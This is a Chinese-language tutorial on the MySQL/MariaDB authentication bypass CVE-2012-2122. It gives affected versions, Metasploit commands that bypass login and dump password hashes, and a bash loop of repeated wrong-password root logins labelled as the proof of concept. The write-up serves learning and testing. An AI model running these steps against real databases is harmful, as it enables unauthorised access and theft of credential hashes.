# MySQL身份绕过验证漏洞(CVE-2012-2122)

**当连接MySQL/MariaDB时，输入的密码会与期望的正确密码相比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的，也就是说只需要知道用户名，不断尝试就能够直接登录SQL数据库，类似爆破按照公告说法大约256次就能够蒙对一次**



# 漏洞影响版本

- MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.
- MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.





# 漏洞利用

**利用方法一：使用msfconsole框架**

![img](https://img-blog.csdnimg.cn/20210908101649590.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA546b5Y2h5be05Y2h5be05be05Lqa5Y2h,size_12,color_FFFFFF,t_70,g_se,x_16)

选中要使用的EXP

```
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
```

查看需要的配置

```
show options
```

配置对方IP即可

```
set rhosts xxx
```

![image-20220422215318131](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220422215318131.png)

设置线程，速度可以快一些

```
set threads 20
```

![img](https://img-blog.csdnimg.cn/20210908101718213.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA546b5Y2h5be05Y2h5be05be05Lqa5Y2h,size_14,color_FFFFFF,t_70,g_se,x_16)

exploit，mysql密码的hash值就在指定文件夹中

![img](https://img-blog.csdnimg.cn/20210908101756312.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA546b5Y2h5be05Y2h5be05be05Lqa5Y2h,size_15,color_FFFFFF,t_70,g_se,x_16)

找到加密后的密码和用户名，进行解密

![img](https://img-blog.csdnimg.cn/20210908101840905.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA546b5Y2h5be05Y2h5be05be05Lqa5Y2h,size_13,color_FFFFFF,t_70,g_se,x_16)

![img](https://img-blog.csdnimg.cn/20210908101850350.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA546b5Y2h5be05Y2h5be05be05Lqa5Y2h,size_19,color_FFFFFF,t_70,g_se,x_16)

成功登录Mysql

![img](https://img-blog.csdnimg.cn/20210908101904310.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA546b5Y2h5be05Y2h5be05be05Lqa5Y2h,size_15,color_FFFFFF,t_70,g_se,x_16)



利用方法二：



在攻击机中Bash环境下允许如下命令：

```
for i in `seq 1 1000`; do mysql -uroot -pwrong -h xxxx -P3306 ; done
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210503190335434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70)

在一定量的尝试后便可成功登录。



# 漏洞POC

```
for i in `seq 1 1000`; do mysql -uroot -pwrong -h 1.1.1.1 -P3306 ; done
```





